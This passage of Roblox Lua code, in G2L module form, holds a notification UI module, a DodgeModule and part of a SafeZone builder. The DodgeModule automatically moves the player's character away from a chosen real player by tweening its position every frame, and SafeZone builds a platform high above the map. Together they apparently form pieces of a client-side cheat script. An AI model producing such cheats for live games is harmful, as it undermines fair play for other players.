			notificationScreenGui = playerGui:FindFirstChild(NOTIFICATION_SCREEN_GUI_NAME)
			if not notificationScreenGui then
				notificationScreenGui = Instance.new("ScreenGui")
				notificationScreenGui.Name = NOTIFICATION_SCREEN_GUI_NAME
				notificationScreenGui.DisplayOrder = 999
				notificationScreenGui.ResetOnSpawn = false
				notificationScreenGui.Parent = playerGui
			end

			notificationContainerFrame = notificationScreenGui:FindFirstChild(NOTIFICATION_CONTAINER_NAME)
			if not notificationContainerFrame then
				notificationContainerFrame = Instance.new("Frame")
				notificationContainerFrame.Name = NOTIFICATION_CONTAINER_NAME
				notificationContainerFrame.BackgroundTransparency = 1
				notificationContainerFrame.Size = UDim2.new(NOTIFICATION_WIDTH_SCALE, 0, NOTIFICATION_MAX_HEIGHT_SCALE, 0)
				-- Position and AnchorPoint will be set by SetNotificationPosition

				notificationStackLayout = Instance.new("UIListLayout")
				notificationStackLayout.Name = "NotificationStackLayout"
				notificationStackLayout.FillDirection = Enum.FillDirection.Vertical
				notificationStackLayout.SortOrder = Enum.SortOrder.LayoutOrder
				notificationStackLayout.Padding = UDim.new(0, NOTIFICATION_SPACING_PIXELS)
				notificationStackLayout.Parent = notificationContainerFrame

				notificationContainerFrame.Parent = notificationScreenGui
				NotificationService.SetNotificationPosition(currentScreenCorner) -- Apply initial position
			else
				notificationStackLayout = notificationContainerFrame:FindFirstChild("NotificationStackLayout") or Instance.new("UIListLayout") -- Ensure it exists
				if not notificationStackLayout.Parent then notificationStackLayout.Parent = notificationContainerFrame end
			end

			if not masterNotificationFrameTemplate then
				local guiTemplate = script:WaitForChild(GUI_TEMPLATE_NAME)
				if not (guiTemplate and (guiTemplate:IsA("ScreenGui") or guiTemplate:IsA("GuiBase2d"))) then
					warn("NotificationService Error: Template '" .. GUI_TEMPLATE_NAME .. "' is " .. (guiTemplate and guiTemplate.ClassName or "nil") .. ", not ScreenGui.")
					return
				end
				local frameTemplateSource = guiTemplate:FindFirstChild(NOTIFICATION_FRAME_TEMPLATE_NAME)
				if frameTemplateSource and frameTemplateSource:IsA("Frame") then
					masterNotificationFrameTemplate = frameTemplateSource:Clone()
					masterNotificationFrameTemplate.Parent = nil
				else
					warn("NotificationService Error: Could not find Frame '" .. NOTIFICATION_FRAME_TEMPLATE_NAME .. "' in '" .. GUI_TEMPLATE_NAME .. "'. Found: " .. (frameTemplateSource and frameTemplateSource.ClassName or "nil"))
					return
				end
			end
		end


		local function _displayNotification(options)
			--if notification enaabled is false
			if not NOTIFICATIONS_ENABLED then
				return
			end
			if not masterNotificationFrameTemplate or not notificationContainerFrame then
				warn("NotificationService: GUI not initialized. Attempting re-init.")
				getOrCreateClientGui()
				if not masterNotificationFrameTemplate or not notificationContainerFrame then
					warn("NotificationService: Failed to initialize GUI. Cannot show notification.")
					return nil
				end
			end

			layoutOrderCounter += 1
			local newNotification = masterNotificationFrameTemplate:Clone()
			newNotification.Name = "Notification_" .. layoutOrderCounter
			newNotification.LayoutOrder = layoutOrderCounter -- For UIListLayout sorting

			-- Apply content and theme
			local titleLabel = newNotification:FindFirstChild("TitleLabel")
			local textLabel = newNotification:FindFirstChild("TextLabel")
			local closeButton = newNotification:FindFirstChild("CloseButton")

			if titleLabel and titleLabel:IsA("TextLabel") then titleLabel.Text = options.title or "Notification" end
			if textLabel and textLabel:IsA("TextLabel") then textLabel.Text = options.text or "" end

			applyThemeAndColors(newNotification, options)

			-- Initial transparency for fade-in
			newNotification.BackgroundTransparency = 1
			if titleLabel then titleLabel.TextTransparency = 1 end
			if textLabel then textLabel.TextTransparency = 1 end
			if closeButton then
				closeButton.BackgroundTransparency = 1
				if closeButton:IsA("ImageButton") then closeButton.ImageTransparency = 1 end
				if closeButton:IsA("TextButton") then closeButton.TextTransparency = 1 end
			end

			newNotification.Parent = notificationContainerFrame

			local notificationData = {
				guiInstance = newNotification,
				options = options,
				durationTimer = nil,
				closeButtonConnection = nil
			}
			table.insert(activeNotificationData, 1, notificationData) -- Add to front for "newest on top/bottom" feel depending on layout

			-- Fade-in Tween
			local tweenInfo = TweenInfo.new(DEFAULT_FADE_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
			local defaultBackgroundTransparency = 0 -- O el valor que prefieras
			local targetTransparency = options.backgroundTransparency ~= nil and options.backgroundTransparency or defaultBackgroundTransparency
			local mainTween = TweenService:Create(newNotification, tweenInfo, { BackgroundTransparency = targetTransparency })
			mainTween:Play() -- Play the main tween
			if titleLabel then TweenService:Create(titleLabel, tweenInfo, { TextTransparency = 0 }):Play() end
			if textLabel then TweenService:Create(textLabel, tweenInfo, { TextTransparency = 0 }):Play() end
			if closeButton then
				local closeButtonGoal = { TextTransparency = 0 }
				if closeButton:IsA("ImageButton") then closeButtonGoal.ImageTransparency = 0 else closeButtonGoal.BackgroundTransparency = (themes[options.theme or defaultThemeName].CloseButtonColor and 0) or 0.5 end
				TweenService:Create(closeButton, tweenInfo, closeButtonGoal):Play()

				notificationData.closeButtonConnection = closeButton.MouseButton1Click:Connect(function()
					if options.ButtonCloseFunction and typeof(options.ButtonCloseFunction) == "function" then
						task.spawn(options.ButtonCloseFunction) -- Use task.spawn to prevent errors/yielding in the callback from stopping the close
					end
					internalCloseNotification(newNotification)
				end)
			end

			-- Auto-close timer
			local duration = options.duration or DEFAULT_NOTIFICATION_DURATION
			if duration and duration > 0 then
				notificationData.durationTimer = task.delay(duration, function()
					if notificationData.guiInstance and notificationData.guiInstance.Parent then -- Check if still valid
						internalCloseNotification(notificationData.guiInstance, true) -- true for autoClose
					end
				end)
			end

			playSound(options.soundOnOpen or soundIdOpen, newNotification)

			return newNotification
		end

		internalCloseNotification = function(notificationInstance, isAutoClose)
			local dataIndex = -1
			local notificationData
			for i, data in activeNotificationData do
				if data.guiInstance == notificationInstance then
					dataIndex = i
					notificationData = data
					break
				end
			end

			if dataIndex == -1 then
				if notificationInstance and notificationInstance.Parent then notificationInstance:Destroy() end
				return -- Already closing or not found
			end

			-- Cancel auto-close timer if manually closed
			if not isAutoClose and notificationData.durationTimer then
				task.cancel(notificationData.durationTimer)
				notificationData.durationTimer = nil
			end

			-- Disconnect close button connection
			if notificationData.closeButtonConnection then
				notificationData.closeButtonConnection:Disconnect()
				notificationData.closeButtonConnection = nil
			end

			table.remove(activeNotificationData, dataIndex)

			playSound(notificationData.options.soundOnClose or soundIdClose, notificationInstance)

			local tweenInfo = TweenInfo.new(DEFAULT_FADE_TIME, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
			local mainTween = TweenService:Create(notificationInstance, tweenInfo, { BackgroundTransparency = 1 })
			mainTween:Play()

			local titleLabel = notificationInstance:FindFirstChild("TitleLabel")
			local textLabel = notificationInstance:FindFirstChild("TextLabel")
			local closeButton = notificationInstance:FindFirstChild("CloseButton")

			if titleLabel then TweenService:Create(titleLabel, tweenInfo, { TextTransparency = 1 }):Play() end
			if textLabel then TweenService:Create(textLabel, tweenInfo, { TextTransparency = 1 }):Play() end
			if closeButton then
				local closeButtonGoal = { TextTransparency = 1 }
				if closeButton:IsA("ImageButton") then closeButtonGoal.ImageTransparency = 1 else closeButtonGoal.BackgroundTransparency = 1 end
				TweenService:Create(closeButton, tweenInfo, closeButtonGoal):Play()
			end

			mainTween.Completed:Connect(function(playbackState)
				if playbackState == Enum.PlaybackState.Completed then
					local originalOptions = notificationData.options
					if notificationInstance and notificationInstance.Parent then
						notificationInstance:Destroy()
					end
					-- Trigger callbacks
					for _, callback in onNotificationClosedCallbacks do
						task.spawn(callback, originalOptions) -- Pass original options
					end
					processNotificationQueue() -- Check if we can show more notifications
				end
			end)
		end

		processNotificationQueue = function()
			if isPaused then return end
			if #activeNotificationData >= MAX_VISIBLE_NOTIFICATIONS then return end
			if #notificationQueue == 0 then return end

			local nextNotificationOptions = table.remove(notificationQueue, 1) -- FIFO
			_displayNotification(nextNotificationOptions)
		end


		-- Public API
		function NotificationService.ShowNotification(options)
			if not RunService:IsClient() then
				warn("NotificationService.ShowNotification can only be called from a LocalScript.")
				return nil
			end

			if not NOTIFICATIONS_ENABLED then
				warn("NotificationService.ShowNotification can only be called if NOTIFICATIONS_ENABLED ("..tostring(NOTIFICATIONS_ENABLED).." / "..tostring(typeof(NOTIFICATIONS_ENABLED))..") Is True.")
				return
			end

			options = options or {} -- Ensure options is a table

			if isPaused or #activeNotificationData >= MAX_VISIBLE_NOTIFICATIONS then
				table.insert(notificationQueue, options)
				return nil -- Indicate it's queued, or return a queue ID in future
			end

			return _displayNotification(options)
		end

		function NotificationService.CloseNotification(notificationInstance)
			if not RunService:IsClient() then return end
			if not notificationInstance or not notificationInstance:IsA("GuiObject") then
				warn("NotificationService: Invalid instance to CloseNotification.")
				return
			end
			internalCloseNotification(notificationInstance, false) -- false for manual close
		end

		function NotificationService.CloseAllNotifications()
			if not RunService:IsClient() then return end
			local notificationsToClose = {}
			for _, data in activeNotificationData do
				table.insert(notificationsToClose, data.guiInstance)
			end
			for _, notifInstance in notificationsToClose do
				internalCloseNotification(notifInstance, false)
			end
		end

		--DEFAULT_FADE_TIME, DEFAULT_NOTIFICATION_DURATION, MAX_VISIBLE_NOTIFICATIONS
		function NotificationService.UpdateSettings(Settings)
			if not RunService:IsClient() then return end
			if typeof(Settings) ~= "table" then
				warn("Settings must be a table.")
				return
			end
			--Search for any coincidence in GetAttributes
			for attributeName, attributeValue in Settings do
				if script:GetAttribute(attributeName) == attributeValue then
					return -- Skip this attribute, it's already set to this value
				end
			end
			-- Apply new settings
			for attributeName, attributeValue in Settings do
				script:SetAttribute(attributeName, attributeValue)
			end

			RunService.Stepped:Wait()

			UpdateNumbersWithAttributes()
		end

		function NotificationService.UpdateNotification(notificationInstance, newOptions)
			if not RunService:IsClient() then return end
			if not notificationInstance or not notificationInstance:IsA("GuiObject") then
				warn("NotificationService: Invalid instance to UpdateNotification.")
				return
			end
			newOptions = newOptions or {}

			local dataIndex = -1
			local notificationData
			for i, data in activeNotificationData do
				if data.guiInstance == notificationInstance then
					dataIndex = i
					notificationData = data
					break
				end
			end

			if not notificationData then
				warn("NotificationService: Notification instance not found for update.")
				return
			end

			-- Update options
			for k, v in newOptions do
				notificationData.options[k] = v
			end

			-- Re-apply visual elements
			local titleLabel = notificationInstance:FindFirstChild("TitleLabel")
			local textLabel = notificationInstance:FindFirstChild("TextLabel")

			if titleLabel and newOptions.title then titleLabel.Text = newOptions.title end
			if textLabel and newOptions.text then textLabel.Text = newOptions.text end

			applyThemeAndColors(notificationInstance, notificationData.options)

			-- Update duration if changed
			if newOptions.duration ~= nil then
				if notificationData.durationTimer then
					task.cancel(notificationData.durationTimer)
					notificationData.durationTimer = nil
				end
				local duration = newOptions.duration or DEFAULT_NOTIFICATION_DURATION -- Use new or default
				if duration and duration > 0 then
					notificationData.durationTimer = task.delay(duration, function()
						if notificationData.guiInstance and notificationData.guiInstance.Parent then
							internalCloseNotification(notificationData.guiInstance, true)
						end
					end)
				end
			end
			-- Consider a small visual cue for update, like a quick highlight or re-fade of text
		end

		function NotificationService.SetNotificationPosition(cornerName)
			if not RunService:IsClient() then return end
			if not notificationContainerFrame or not notificationStackLayout then
				warn("NotificationService: Container not ready for SetNotificationPosition.")
				getOrCreateClientGui() -- Try to init
				if not notificationContainerFrame or not notificationStackLayout then return end
			end

			currentScreenCorner = cornerName
			local anchorPoint = Vector2.new(0.5, 0.5)
			local position = UDim2.fromScale(0.5, 0.5)
			local verticalAlignment = Enum.VerticalAlignment.Bottom
			local horizontalAlignment = Enum.HorizontalAlignment.Right

			if cornerName == "BottomRight" then
				anchorPoint = Vector2.new(1, 1)
				position = UDim2.new(1, -NOTIFICATION_SPACING_PIXELS, 1, -NOTIFICATION_SPACING_PIXELS)
				verticalAlignment = Enum.VerticalAlignment.Bottom
				horizontalAlignment = Enum.HorizontalAlignment.Right
			elseif cornerName == "BottomLeft" then
				anchorPoint = Vector2.new(0, 1)
				position = UDim2.new(0, NOTIFICATION_SPACING_PIXELS, 1, -NOTIFICATION_SPACING_PIXELS)
				verticalAlignment = Enum.VerticalAlignment.Bottom
				horizontalAlignment = Enum.HorizontalAlignment.Left
			elseif cornerName == "TopRight" then
				anchorPoint = Vector2.new(1, 0)
				position = UDim2.new(1, -NOTIFICATION_SPACING_PIXELS, 0, NOTIFICATION_SPACING_PIXELS)
				verticalAlignment = Enum.VerticalAlignment.Top
				horizontalAlignment = Enum.HorizontalAlignment.Right
			elseif cornerName == "TopLeft" then
				anchorPoint = Vector2.new(0, 0)
				position = UDim2.new(0, NOTIFICATION_SPACING_PIXELS, 0, NOTIFICATION_SPACING_PIXELS)
				verticalAlignment = Enum.VerticalAlignment.Top
				horizontalAlignment = Enum.HorizontalAlignment.Left
			end

			notificationContainerFrame.AnchorPoint = anchorPoint
			notificationContainerFrame.Position = position
			notificationStackLayout.VerticalAlignment = verticalAlignment
			notificationStackLayout.HorizontalAlignment = horizontalAlignment
		end

		function NotificationService.SetDefaultTheme(themeName)
			if themes[themeName] then
				defaultThemeName = themeName
			else
				warn("NotificationService: Theme '" .. tostring(themeName) .. "' not found.")
			end
		end

		function NotificationService.GetActiveNotifications()
			if not RunService:IsClient() then return {} end
			local guis = {}
			for _, data in activeNotificationData do
				table.insert(guis, data.guiInstance)
			end
			return guis
		end

		function NotificationService.PauseNotifications()
			if not RunService:IsClient() then return end
			isPaused = true
		end

		function NotificationService.ResumeNotifications()
			if not RunService:IsClient() then return end
			isPaused = false
			processNotificationQueue()
		end

		function NotificationService.OnNotificationClosed(callback)
			if typeof(callback) == "function" then
				table.insert(onNotificationClosedCallbacks, callback)
			else
				warn("NotificationService: OnNotificationClosed expects a function.")
			end
		end

		function NotificationService.RemoveAnyOnNotificationClosed()
			if not RunService:IsClient() then return end
			onNotificationClosedCallbacks = {}
		end


		function NotificationService.SetSounds(openId, closeId)
			soundIdOpen = openId
			soundIdClose = closeId
		end

		function NotificationService.NOTIFICATIONS_ENABLED(Bool: boolean)
			if not RunService:IsClient() then return end
			NOTIFICATIONS_ENABLED = Bool
		end
		-- Initialize GUI on client when module is first required
		if RunService:IsClient() then
			getOrCreateClientGui()
		end

		return NotificationService


	end;
};
G2L_MODULES[G2L["1df"]] = {
	Closure = function()
		local script = G2L["1df"];
		-- DodgeModule.lua
		-- A module that allows the local player's character to dynamically evade a specific real player using intelligent vector math and realistic movement

		local Players = game:GetService("Players")
		local TweenService = game:GetService("TweenService")
		local RunService = game:GetService("RunService")
		local Workspace = game:GetService("Workspace")

		local DodgeModule = {}

		local isDodging = false
		local dodgeConnection = nil
		local targetPlayer = nil

		local localPlayer = Players.LocalPlayer
		local character = nil
		local humanoid = nil
		local rootPart = nil

		-- Constants
		local SAFE_DISTANCE = 20             -- Distance at which to begin evasion
		local CLOSE_DISTANCE = 10            -- When to trigger more aggressive evasive moves
		local JUMP_DISTANCE = 6              -- When to jump to avoid direct impact
		local DODGE_SPEED = 12               -- Movement speed for evasion
		local RAYCAST_DISTANCE = 5           -- Distance to raycast to avoid obstacles
		local TWEEN_TIME = 0.25              -- Smooth interpolation duration

		-- Utility Functions

		-- Get distance between two Vector3 positions
		local function getDistance(pos1, pos2)
			return (pos1 - pos2).Magnitude
		end

		-- Get direction from one Vector3 to another
		local function getDirection(from, to)
			return (to - from).Unit
		end

		-- Predict future position based on velocity
		local function predictPosition(targetRoot)
			local velocity = targetRoot.Velocity
			local predictionTime = 0.3
			return targetRoot.Position + velocity * predictionTime
		end

		-- Check if the path is blocked using raycasting
		local function isPathBlocked(direction)
			local origin = rootPart.Position
			local rayParams = RaycastParams.new()
			rayParams.FilterDescendantsInstances = {character}
			rayParams.FilterType = Enum.RaycastFilterType.Blacklist

			local result = Workspace:Raycast(origin, direction * RAYCAST_DISTANCE, rayParams)
			return result ~= nil
		end

		-- Jump if the target is approaching head-on
		local function shouldJump(enemyDirection)
			local forward = rootPart.CFrame.LookVector
			local dot = forward:Dot(enemyDirection)
			return dot > 0.8
		end

		-- Move the character in a direction with smooth interpolation
		local function moveSmoothly(direction)
			local goalPosition = rootPart.Position + direction * DODGE_SPEED

			-- Adjust to avoid obstacles
			if isPathBlocked(direction) then
				-- Try strafing sideways
				local right = rootPart.CFrame.RightVector
				local altDirection = (direction + right).Unit
				goalPosition = rootPart.Position + altDirection * DODGE_SPEED
			end

			local tween = TweenService:Create(
				rootPart,
				TweenInfo.new(TWEEN_TIME, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
				{CFrame = CFrame.new(goalPosition)}
			)
			tween:Play()
		end

		-- Main evasion logic (runs every frame)
		local function dodgeStep()
			if not targetPlayer or not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
				return
			end

			local targetRoot = targetPlayer.Character.HumanoidRootPart
			local predictedPos = predictPosition(targetRoot)
			local distance = getDistance(rootPart.Position, predictedPos)

			if distance < SAFE_DISTANCE then
				local evadeDirection = (rootPart.Position - predictedPos).Unit

				-- From behind? (dot product < -0.6)
				local targetDir = getDirection(predictedPos, rootPart.Position)
				local localLook = rootPart.CFrame.LookVector
				if localLook:Dot(targetDir) < -0.6 then
					-- Move quickly sideways to dodge
					local dodgeSide = rootPart.CFrame.RightVector * (math.random() > 0.5 and 1 or -1)
					evadeDirection = (evadeDirection + dodgeSide).Unit
				end

				-- Jump if very close and head-on
				if distance < JUMP_DISTANCE and shouldJump(getDirection(predictedPos, rootPart.Position)) then
					if humanoid and humanoid.FloorMaterial ~= Enum.Material.Air then
						humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
					end
				end

				moveSmoothly(evadeDirection)
			end
		end

		-- Initializes character references
		local function updateCharacter()
			character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
			humanoid = character:WaitForChild("Humanoid")
			rootPart = character:WaitForChild("HumanoidRootPart")
		end

		-- Starts the evasion loop
		function DodgeModule.StartDodging(target)
			assert(target and target:IsA("Player") and target ~= localPlayer, "Invalid target player")

			targetPlayer = target
			updateCharacter()

			if isDodging then return end
			isDodging = true

			dodgeConnection = RunService.RenderStepped:Connect(function()
				if character and humanoid and humanoid.Health > 0 then
					dodgeStep()
				end
			end)
		end

		-- Stops the evasion loop
		function DodgeModule.StopDodging()
			isDodging = false
			if dodgeConnection then
				dodgeConnection:Disconnect()
				dodgeConnection = nil
			end
		end

		return DodgeModule

	end;
};
G2L_MODULES[G2L["1e0"]] = {
	Closure = function()
		local script = G2L["1e0"];
		local SafeZone = {}

		local TheSafeZone = nil
		function SafeZone:MakeSafeZone()
			print("creating safe zone...")
			local mas = Instance.new("Model", game:GetService("Workspace"))
			TheSafeZone = mas
			local Model0 = Instance.new("Model")
			local Part1 = Instance.new("Part")
			local SpawnLocation2 = Instance.new("SpawnLocation")
			local Decal3 = Instance.new("Decal")
			local Part4 = Instance.new("Part")
			local Part5 = Instance.new("Part")
			local Part6 = Instance.new("Part")
			local Part7 = Instance.new("Part")
			local Part8 = Instance.new("Part")
			local Part9 = Instance.new("Part")
			local Part10 = Instance.new("Part")
			local Part11 = Instance.new("Part")
			local Part12 = Instance.new("Part")
			local Part13 = Instance.new("Part")
			local Part14 = Instance.new("Part")
			local Part15 = Instance.new("Part")
			local Model16 = Instance.new("Model")
			local Model17 = Instance.new("Model")
			local Part18 = Instance.new("Part")
			local CylinderMesh19 = Instance.new("CylinderMesh")
			local PointLight20 = Instance.new("PointLight")
			local Weld21 = Instance.new("Weld")
			local Part22 = Instance.new("Part")
			local CylinderMesh23 = Instance.new("CylinderMesh")
			local Weld24 = Instance.new("Weld")
			local Part25 = Instance.new("Part")
			local PointLight26 = Instance.new("PointLight")
			local Part27 = Instance.new("Part")
			local PointLight28 = Instance.new("PointLight")
			local Part29 = Instance.new("Part")
			local PointLight30 = Instance.new("PointLight")
			local Part31 = Instance.new("Part")
			local PointLight32 = Instance.new("PointLight")
			local Model33 = Instance.new("Model")
			local Model34 = Instance.new("Model")
			local Part35 = Instance.new("Part")
			local CylinderMesh36 = Instance.new("CylinderMesh")
			local PointLight37 = Instance.new("PointLight")
			local Weld38 = Instance.new("Weld")
			local Part39 = Instance.new("Part")
			local CylinderMesh40 = Instance.new("CylinderMesh")
			local Weld41 = Instance.new("Weld")
			local Model42 = Instance.new("Model")
			local Model43 = Instance.new("Model")
			local Part44 = Instance.new("Part")
			local CylinderMesh45 = Instance.new("CylinderMesh")
			local PointLight46 = Instance.new("PointLight")
			local Weld47 = Instance.new("Weld")
			local Part48 = Instance.new("Part")
			local CylinderMesh49 = Instance.new("CylinderMesh")
			local Weld50 = Instance.new("Weld")
			local Model51 = Instance.new("Model")
			local Part52 = Instance.new("Part")
			local Part53 = Instance.new("Part")
			local Part54 = Instance.new("Part")
			local Part55 = Instance.new("Part")
			local Part56 = Instance.new("Part")
			local Seat57 = Instance.new("Seat")
			local Part58 = Instance.new("Part")
			local Part59 = Instance.new("Part")
			local Part60 = Instance.new("Part")
			local UnionOperation61 = Instance.new("UnionOperation")
			local Model62 = Instance.new("Model")
			local Model63 = Instance.new("Model")
			local Part64 = Instance.new("Part")
			local CylinderMesh65 = Instance.new("CylinderMesh")
			local PointLight66 = Instance.new("PointLight")
			local Weld67 = Instance.new("Weld")
			local Part68 = Instance.new("Part")
			local CylinderMesh69 = Instance.new("CylinderMesh")
			local Weld70 = Instance.new("Weld")
			local Model71 = Instance.new("Model")
			local Part72 = Instance.new("Part")
			local Part73 = Instance.new("Part")
			local Part74 = Instance.new("Part")
			local Part75 = Instance.new("Part")
			local Part76 = Instance.new("Part")
			local Seat77 = Instance.new("Seat")
			local Part78 = Instance.new("Part")
			local Part79 = Instance.new("Part")
			local Part80 = Instance.new("Part")
			local UnionOperation81 = Instance.new("UnionOperation")
			local Part82 = Instance.new("Part")
			local SurfaceGui83 = Instance.new("SurfaceGui")
			local TextLabel84 = Instance.new("TextLabel")
			local TextLabel85 = Instance.new("TextLabel")
			local Part86 = Instance.new("Part")
			local SurfaceGui87 = Instance.new("SurfaceGui")
			local TextLabel88 = Instance.new("TextLabel")
			local TextLabel89 = Instance.new("TextLabel")
			local Part90 = Instance.new("Part")
			local SurfaceGui91 = Instance.new("SurfaceGui")
			local TextLabel92 = Instance.new("TextLabel")
			local TextLabel93 = Instance.new("TextLabel")
			local Model94 = Instance.new("Model")
			local Part95 = Instance.new("Part")
			local Part96 = Instance.new("Part")
			local Part97 = Instance.new("Part")
			local Part98 = Instance.new("Part")
			local Part99 = Instance.new("Part")
			local Seat100 = Instance.new("Seat")
			local Part101 = Instance.new("Part")
			local Part102 = Instance.new("Part")
			local Part103 = Instance.new("Part")
			local UnionOperation104 = Instance.new("UnionOperation")
			local Model105 = Instance.new("Model")
			local Part106 = Instance.new("Part")
			local Part107 = Instance.new("Part")
			local Part108 = Instance.new("Part")
			local Part109 = Instance.new("Part")
			local Part110 = Instance.new("Part")
			local Seat111 = Instance.new("Seat")
			local Part112 = Instance.new("Part")
			local Part113 = Instance.new("Part")
			local Part114 = Instance.new("Part")
			local UnionOperation115 = Instance.new("UnionOperation")

			Model0.Name = "SafeZone"
			Model0.Parent = mas
			Model0.PrimaryPart = Part1
			Part1.Name = "Baseplate"
			Part1.Parent = Model0
			Part1.CFrame = CFrame.new(494.5, 4863, -116.500015, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part1.Position = Vector3.new(494.5, 4863, -116.50001525878906)
			Part1.Color = Color3.new(0.423529, 0.345098, 0.294118)
			Part1.Size = Vector3.new(89, 62, 103.95651245117188)
			Part1.Anchored = true
			Part1.BottomSurface = Enum.SurfaceType.Smooth
			Part1.BrickColor = BrickColor.new("Pine Cone")
			Part1.Material = Enum.Material.WoodPlanks
			Part1.TopSurface = Enum.SurfaceType.Smooth
			Part1.brickColor = BrickColor.new("Pine Cone")
			SpawnLocation2.Parent = Model0
			SpawnLocation2.CFrame = CFrame.new(496, 4894.5, -86, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			SpawnLocation2.Position = Vector3.new(496, 4894.5, -86)
			SpawnLocation2.Size = Vector3.new(12, 1, 12)
			SpawnLocation2.Anchored = true
			SpawnLocation2.BottomSurface = Enum.SurfaceType.Smooth
			SpawnLocation2.TopSurface = Enum.SurfaceType.Smooth
			Decal3.Parent = SpawnLocation2
			Decal3.Texture = "rbxasset://textures/SpawnLocation.png"
			Decal3.Face = Enum.NormalId.Top
			Part4.Name = "Brick"
			Part4.Parent = Model0
			Part4.CFrame = CFrame.new(494.5, 4895, -168.000015, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part4.Position = Vector3.new(494.5, 4895, -168.00001525878906)
			Part4.Color = Color3.new(0.423529, 0.345098, 0.294118)
			Part4.Transparency = 0.10000000149011612
			Part4.Size = Vector3.new(89, 126, 0.956512451171875)
			Part4.Anchored = true
			Part4.BottomSurface = Enum.SurfaceType.Smooth
			Part4.BrickColor = BrickColor.new("Pine Cone")
			Part4.Material = Enum.Material.WoodPlanks
			Part4.TopSurface = Enum.SurfaceType.Smooth
			Part4.brickColor = BrickColor.new("Pine Cone")
			Part5.Name = "Brick"
			Part5.Parent = Model0
			Part5.CFrame = CFrame.new(450.5, 4895, -116.000015, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part5.Position = Vector3.new(450.5, 4895, -116.00001525878906)
			Part5.Color = Color3.new(0.423529, 0.345098, 0.294118)
			Part5.Transparency = 0.10000000149011612
			Part5.Size = Vector3.new(1, 126, 104.95651245117188)
			Part5.Anchored = true
			Part5.BottomSurface = Enum.SurfaceType.Smooth
			Part5.BrickColor = BrickColor.new("Pine Cone")
			Part5.Material = Enum.Material.WoodPlanks
			Part5.TopSurface = Enum.SurfaceType.Smooth
			Part5.brickColor = BrickColor.new("Pine Cone")
			Part6.Name = "Brick"
			Part6.Parent = Model0
			Part6.CFrame = CFrame.new(494.5, 4895, -64.0000153, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part6.Position = Vector3.new(494.5, 4895, -64.00001525878906)
			Part6.Color = Color3.new(0.423529, 0.345098, 0.294118)
			Part6.Transparency = 0.10000000149011612
			Part6.Size = Vector3.new(89, 126, 0.956512451171875)
			Part6.Anchored = true
			Part6.BottomSurface = Enum.SurfaceType.Smooth
			Part6.BrickColor = BrickColor.new("Pine Cone")
			Part6.Material = Enum.Material.WoodPlanks
			Part6.TopSurface = Enum.SurfaceType.Smooth
			Part6.brickColor = BrickColor.new("Pine Cone")
			Part7.Name = "Brick"
			Part7.Parent = Model0
			Part7.CFrame = CFrame.new(538.5, 4895, -116.000023, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part7.Position = Vector3.new(538.5, 4895, -116.0000228881836)
			Part7.Color = Color3.new(0.423529, 0.345098, 0.294118)
			Part7.Transparency = 0.10000000149011612
			Part7.Size = Vector3.new(1, 126, 104.95652770996094)
			Part7.Anchored = true
			Part7.BottomSurface = Enum.SurfaceType.Smooth
			Part7.BrickColor = BrickColor.new("Pine Cone")
			Part7.Material = Enum.Material.WoodPlanks
			Part7.TopSurface = Enum.SurfaceType.Smooth
			Part7.brickColor = BrickColor.new("Pine Cone")
			Part8.Name = "Brick"
			Part8.Parent = Model0
			Part8.CFrame = CFrame.new(494.5, 4957.5, -116.000023, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part8.Position = Vector3.new(494.5, 4957.5, -116.0000228881836)
			Part8.Color = Color3.new(0.423529, 0.345098, 0.294118)
			Part8.Transparency = 0.10000000149011612
			Part8.Size = Vector3.new(89, 1, 104.95652770996094)
			Part8.Anchored = true
			Part8.BottomSurface = Enum.SurfaceType.Smooth
			Part8.BrickColor = BrickColor.new("Pine Cone")
			Part8.Material = Enum.Material.WoodPlanks
			Part8.TopSurface = Enum.SurfaceType.Smooth
			Part8.brickColor = BrickColor.new("Pine Cone")
			Part9.Name = "BlackPart"
			Part9.Parent = Model0
			Part9.CFrame = CFrame.new(464.5, 4958.49951, -92, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part9.Position = Vector3.new(464.5, 4958.49951171875, -92)
			Part9.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
			Part9.Size = Vector3.new(177, 1, 208)
			Part9.Anchored = true
			Part9.BottomSurface = Enum.SurfaceType.Smooth
			Part9.BrickColor = BrickColor.new("Really black")
			Part9.TopSurface = Enum.SurfaceType.Smooth
			Part9.brickColor = BrickColor.new("Really black")
			Part10.Name = "BlackPart"
			Part10.Parent = Model0
			Part10.CFrame = CFrame.new(483, 4857.49951, -186.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part10.Position = Vector3.new(483, 4857.49951171875, -186.5)
			Part10.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
			Part10.Size = Vector3.new(116, 297, 1)
			Part10.Anchored = true
			Part10.BottomSurface = Enum.SurfaceType.Smooth
			Part10.BrickColor = BrickColor.new("Really black")
			Part10.TopSurface = Enum.SurfaceType.Smooth
			Part10.brickColor = BrickColor.new("Really black")
			Part11.Name = "BlackPart"
			Part11.Parent = Model0
			Part11.CFrame = CFrame.new(425.5, 4772.99951, -106, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part11.Position = Vector3.new(425.5, 4772.99951171875, -106)
			Part11.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
			Part11.Size = Vector3.new(1, 372, 162)
			Part11.Anchored = true
			Part11.BottomSurface = Enum.SurfaceType.Smooth
			Part11.BrickColor = BrickColor.new("Really black")
			Part11.TopSurface = Enum.SurfaceType.Smooth
			Part11.brickColor = BrickColor.new("Really black")
			Part12.Name = "BlackPart"
			Part12.Parent = Model0
			Part12.CFrame = CFrame.new(556.5, 4857.49951, -186.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)
			Part12.Position = Vector3.new(556.5, 4857.49951171875, -186.5)
